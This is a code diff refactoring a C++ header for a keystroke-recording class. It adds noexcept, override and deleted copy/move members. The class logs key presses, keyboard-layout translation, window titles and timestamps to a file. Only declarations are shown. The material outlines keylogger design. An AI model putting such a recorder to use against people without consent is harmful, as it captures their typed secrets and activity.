@@ -20,11 +20,19 @@ class KeysRecorder
 {
 public:
     KeysRecorder(std::string file_name);
-    virtual ~KeysRecorder();
+    virtual ~KeysRecorder() = default;
 
-    void KeystrokeSavingRoutine();
-    void AppendLog();
-    void RestartLog();
+	// Copy is forbidden
+	KeysRecorder(const KeysRecorder& other) 			 = delete;
+	KeysRecorder& operator=(const KeysRecorder& other) = delete;
+
+	// Move is forbidden
+	KeysRecorder(KeysRecorder&& other) 	  			 = delete;
+	KeysRecorder& operator=(KeysRecorder&& other) 	 = delete;
+
+    void KeystrokeSavingRoutine() noexcept override;
+    void AppendLog()              noexcept override;
+    void RestartLog()             noexcept override;
 
 protected:
 
@@ -33,32 +41,32 @@ protected:
       * PC's local time to file if it has changed since
       * last call to this function.
       */
-    void LogWindowAndTimeOnChange();
+    void LogWindowAndTimeOnChange() noexcept;
 
     /**
       * Function saves foreground window's title and
       * PC's local time to file.
       */
-    void LogWindowAndTime(wchar_t *window_title);
+    void LogWindowAndTime(wchar_t *window_title) noexcept;
 
     /**
       * Function saves key strokes to log file.
       */
-    void LogKeys();
+    void LogKeys() noexcept;
 
     /**
       * Function translates a keystroke to the language
       * matching the keyboard layout before saving to log file.
       * @param[in] keystroke - the scanned keystroke
       */
-    void WritesScannedKeyToFile(short keystroke);
+    void WritesScannedKeyToFile(short keystroke) noexcept;
 
     /**
       * Function writes text to a file.
       * File's name is m_fileName.
       * @param[in] text - text to write.
       */
-    void WriteToFile(const wchar_t *text);
+    void WriteToFile(const wchar_t *text) noexcept;
 
 
 private:
@@ -74,7 +82,7 @@ private:
     /**
       * This function initializes m_table.
       */
-    void InitializeTable();
+    void InitializeTable() noexcept;
 
 };
 }
